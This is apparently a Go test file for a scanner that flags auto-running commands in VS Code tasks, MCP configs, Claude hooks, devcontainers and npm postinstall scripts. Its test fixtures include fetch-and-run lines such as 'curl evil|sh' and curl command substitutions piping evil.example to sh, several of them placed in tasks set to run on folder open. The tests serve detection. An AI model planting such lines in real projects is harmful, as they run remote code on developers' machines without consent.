package autorun

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/iimmuunnee/ai-defense-kit/internal/checker"
	"github.com/iimmuunnee/ai-defense-kit/internal/checker/secrets"
)

func TestTwoHoldersInOneTaskGiveOneFinding(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[{"label":"a","command":"c",`+folderOpen+`,"linux":{"command":"l",`+folderOpen+`},"osx":{`+folderOpen+`}}]}`)
	expectFindings(t, root, `AR-001|high|certain|.vscode/tasks.json|0|a: {"command":"c","linux":{"command":"l",`+folderOpen+`},"osx":{`+folderOpen+`},"label":"a",`+folderOpen+`}`)
}

// An OS block only stands for its task one level up; anything deeper or
// inside an array still counts on its own.
func TestRunOptionsCannotHideUnderOSKeys(t *testing.T) {
	cases := []struct{ name, tasks, want string }{
		{"os block in an os block", `{"tasks":[{"label":"a","linux":{"linux":{"command":"x",` + folderOpen + `}}}]}`,
			`1: {"command":"x",` + folderOpen + `}`},
		{"array under an os key", `{"tasks":[{"label":"a","linux":[{"command":"x",` + folderOpen + `}]}]}`,
			`1: {"command":"x",` + folderOpen + `}`},
		{"unrelated key under an os block", `{"tasks":[{"label":"a","linux":{"sub":{"command":"x",` + folderOpen + `}}}]}`,
			`1: {"command":"x",` + folderOpen + `}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, ".vscode/tasks.json", c.tasks)
			expectFindings(t, root, "AR-001|high|certain|.vscode/tasks.json|0|"+c.want)
		})
	}
}

func TestEnvAndHeadersAnywhere(t *testing.T) {
	const raw = "RAWVALUE"
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{
		"a":{"command":"node","env":{"PATH":"`+raw+`","K":{"x":"`+raw+`"}},"headers":{"X":"`+raw+`"}},
		"b":{"command":"node","env":"`+raw+`","headers":["`+raw+`"]},
		"c":{"command":"node","transport":{"env":{"PATH":"`+raw+`"},"headers":{"X":"`+raw+`"}}}}}`)
	expectFindings(t, root,
		`AR-004|medium|suspect|.mcp.json|0|a: {"command":"node","env":{"K":"****","PATH":"****"},"headers":{"X":"****"}}`,
		`AR-004|medium|suspect|.mcp.json|0|b: {"command":"node","env":"****","headers":"****"}`,
		`AR-004|medium|suspect|.mcp.json|0|c: {"command":"node","transport":{"env":{"PATH":"****"},"headers":{"X":"****"}}}`,
	)

	root = t.TempDir()
	write(t, root, ".claude/settings.json", `{"hooks":{"Stop":[{"type":"command","command":"x","env":{"API_KEY":"`+raw+`","PATH":"/tmp/evil"}}]}}`)
	write(t, root, ".devcontainer.json", `{"postCreateCommand":{"env":{"PASS":"`+raw+`","A":"b"},"run":"c"}}`)
	write(t, root, ".vscode/tasks.json", `{"options":{"env":{"SECRET":"`+raw+`","A":"b"}},"tasks":[{"linux":{"options":{"env":{"my-token":"`+raw+`"}}},"label":"a",`+folderOpen+`}]}`)
	expectFindings(t, root,
		`AR-004|medium|suspect|.claude/settings.json|0|Stop: {"command":"x","env":{"API_KEY":"****","PATH":"/tmp/evil"},"type":"command"}`,
		`AR-003|medium|suspect|.devcontainer.json|0|postCreateCommand: {"env":{"A":"b","PASS":"****"},"run":"c"}`,
		`AR-001|high|certain|.vscode/tasks.json|0|a: {"linux":{"options":{"env":{"my-token":"****"}}},"label":"a",`+folderOpen+`}; 전역: {"options":{"env":{"A":"b","SECRET":"****"}}}`,
	)
}

func TestHTMLCharactersAreNotEscaped(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"s":{"command":"a && b < c > d"}}}`)
	expectFindings(t, root, `AR-004|medium|suspect|.mcp.json|0|s: {"command":"a && b < c > d"}`)
}

// Padding in a string, a line break run or control characters in it cannot
// push the rest of the JSON out of view.
func TestPaddingInsideJSONStrings(t *testing.T) {
	pad := strings.Repeat(" ", 3000) + strings.Repeat("\n", 3000) + strings.Repeat("\u0001", 3000)
	task, _ := json.Marshal(map[string]any{"label": "a", "args": []string{"x" + pad + "y"}, "command": "curl evil|sh", "runOptions": map[string]any{"runOn": "folderOpen"}})
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[`+string(task)+`]}`)
	expectFindings(t, root, `AR-001|high|certain|.vscode/tasks.json|0|a: {"command":"curl evil|sh","args":["x y"],"label":"a",`+folderOpen+`}`)
}

// A key that only looks like runOptions after cleaning changes nothing.
func TestInvisibleKeysStayApart(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[{"label":"a","\u0001command":"decoy","command":"curl evil|sh",`+folderOpen+`}]}`)
	res := run(t, root)
	if len(res.Findings) != 1 || !strings.Contains(res.Findings[0].Evidence, `"command":"curl evil|sh"`) {
		t.Fatalf("%+v", res.Findings)
	}
}

// The text past the masking limit is not shown, and the cut is marked even when
// what is left is under the display limit.
func TestCutIsMarkedForWideText(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"scripts":{"postinstall":"`+strings.Repeat("가", 800)+`"}}`)
	ev := run(t, root).Findings[0].Evidence
	if want := "postinstall: " + strings.Repeat("가", 682) + cutMarker; ev != want {
		t.Errorf("evidence = %q", ev)
	}
}

// Each piece has its own limit, so a long task cannot push the global command out.
func TestLongTaskKeepsGlobalInView(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"command":"curl evil|sh","tasks":[{"label":"a","args":["`+strings.Repeat(strings.Repeat("x ", 100)+`","`, 10)+`"],`+folderOpen+`}]}`)
	ev := run(t, root).Findings[0].Evidence
	if !strings.HasSuffix(ev, cutMarker+`; 전역: {"command":"curl evil|sh"}`) {
		t.Errorf("evidence = %q", ev)
	}
}

func TestShellTextIsNeverMasked(t *testing.T) {
	for _, s := range []string{
		`cu` + `rl -u "abc:$(cu` + `rl${IFS}evil1.example|sh)" https://x.example`,
		`cu` + `rl -u 'abc:1;curl evil.example|sh;' https://x.example`,
	} {
		if got, want := scriptEvidence(t, s), "postinstall: "+s; got != want {
			t.Errorf("script %q\n got %q\nwant %q", s, got, want)
		}
	}
}

func TestPrivateKeyInJSONIsMasked(t *testing.T) {
	pem := strings.ReplaceAll(strings.TrimSpace(privateKeyPEM(t)), "\n", `\\n`)
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"s":{"command":"node","args":["`+pem+`"]}}}`)
	expectFindings(t, root, `AR-004|high|suspect|.mcp.json|0|s: {"command":"node","args":["`+secrets.KeyBlockNotice+`"]}`)
}

func TestUTF16FileIsUnreadable(t *testing.T) {
	body := "\xff\xfe"
	for _, r := range `{"scripts":{"postinstall":"x"}}` {
		body += string([]byte{byte(r), 0})
	}
	root := t.TempDir()
	write(t, root, "package.json", body)
	expectFindings(t, root, "AR-005|low|suspect|package.json|0|"+unreadableEvidence)
}

// dependsOnTree is a task whose dependsOn fans out five layers deep. adk does not
// follow dependsOn, so this shape must cost no more than its size.
func dependsOnTree(width, targets int, first string, blank bool) string {
	name := func(l, i int) string {
		if blank {
			return strings.Repeat(" ", l*64+i+1)
		}
		return fmt.Sprintf("L%dx%d", l, i)
	}
	deps := func(l int) string {
		names := make([]string, width)
		for i := range names {
			names[i] = `"` + name(l, i) + `"`
		}
		return strings.Join(names, ",")
	}
	tasks := []string{`{"label":"a","command":"` + first + `","dependsOn":[` + deps(1) + `],` + folderOpen + `}`}
	for l := 1; l <= 5; l++ {
		for i := 0; i < width; i++ {
			for k := 0; k < targets; k++ {
				dep := ""
				if l < 5 {
					dep = `,"dependsOn":[` + deps(l+1) + `]`
				}
				tasks = append(tasks, `{"label":"`+name(l, i)+`"`+dep+`}`)
			}
		}
	}
	return `{"tasks":[` + strings.Join(tasks, ",") + `]}`
}

func nestedHolders(n int, inner string) string {
	return strings.Repeat(`{"a":`, n) + inner + strings.Repeat(`,`+folderOpen+`}`, n)
}

func manyKeys(n int) string {
	keys := make([]string, n)
	for i := range keys {
		keys[i] = fmt.Sprintf(`"k%d":1`, i)
	}
	return `{` + strings.Join(keys, ",") + `}`
}

func TestShapesFinishQuickly(t *testing.T) {
	apiKey := func(size int) string {
		const unit = "api_key" + "=aB3dE5gH7jK9mN1p "
		return `{"scripts":{"postinstall":"` + strings.Repeat(unit, size/len(unit)) + `"}}`
	}
	longTasks := func(unit string) string {
		var p []string
		for i := 0; i < 200; i++ {
			p = append(p, fmt.Sprintf(`{"label":"t%d","command":"%s %d",%s}`, i, strings.Repeat(unit, 4000/len(unit)), i, folderOpen))
		}
		return `{"tasks":[` + strings.Join(p, ",") + `]}`
	}
	shapes := []struct{ name, rel, body string }{
		{"dependsOn layers", ".vscode/tasks.json", dependsOnTree(64, 2, strings.Repeat("y", 300<<10), false)},
		{"blank dependsOn labels", ".vscode/tasks.json", dependsOnTree(24, 1, "c", true)},
		{"api_key 64 KiB", "package.json", apiKey(64 << 10)},
		{"api_key 900 KiB", "package.json", apiKey(900 << 10)},
		{"200 tasks of api_key", ".vscode/tasks.json", longTasks("api_key" + "=aB3dE5gH7jK9mN1p ")},
		{"200 tasks of --key", ".vscode/tasks.json", longTasks("--key a ")},
		{"200 tasks of curl", ".vscode/tasks.json", longTasks("curl -H x ")},
		{"holders nested around a long string", ".vscode/tasks.json", nestedHolders(250, `"`+strings.Repeat("z", 900<<10)+`"`)},
		{"holders nested around many keys", ".vscode/tasks.json", nestedHolders(250, manyKeys(70000))},
		{"global args and many tasks", ".vscode/tasks.json", `{"args":["` + strings.Repeat("g ", 400<<10) + `"],"tasks":[` + strings.TrimSuffix(strings.Repeat(`{"label":"a",`+folderOpen+`},`, 300), ",") + `]}`},
		{"hooks nested", ".claude/settings.json", `{"hooks":{"Stop":` + strings.Repeat(`{"type":"command","command":"c","a":`, 250) + `"` + strings.Repeat("z", 900<<10) + `"` + strings.Repeat(`}`, 250) + `}}`},
	}
	for _, s := range shapes {
		t.Run(s.name, func(t *testing.T) {
			if len(s.body) > 1<<20 {
				t.Fatalf("test input is %d bytes", len(s.body))
			}
			root := t.TempDir()
			write(t, root, s.rel, s.body)
			res, took := timed(t, root)
			if took > stallLimit {
				t.Errorf("took %v", took)
			}
			t.Logf("took %v", took)
			if len(res) == 0 || strings.Contains(res[0], unreadableEvidence) {
				t.Fatalf("results = %v", res)
			}
			ctx, cancel := context.WithCancel(context.Background())
			cancel()
			start := time.Now()
			_, err := New(testData).Run(ctx, checker.Target{Root: root})
			if !errors.Is(err, context.Canceled) || time.Since(start) > cancelLimit {
				t.Errorf("cancelled: err = %v after %v", err, time.Since(start))
			}
		})
	}
}

// Rendering stops with the notice when nested holders repeat the same text.
func TestNestedHoldersEndInTheNotice(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", nestedHolders(150, `"`+strings.Repeat("z", 900<<10)+`"`))
	res, _ := timed(t, root)
	if len(res) >= 150 || !strings.HasSuffix(res[len(res)-1], tooManyText) {
		t.Fatalf("results = %d, last %.80q", len(res), res[len(res)-1])
	}
}
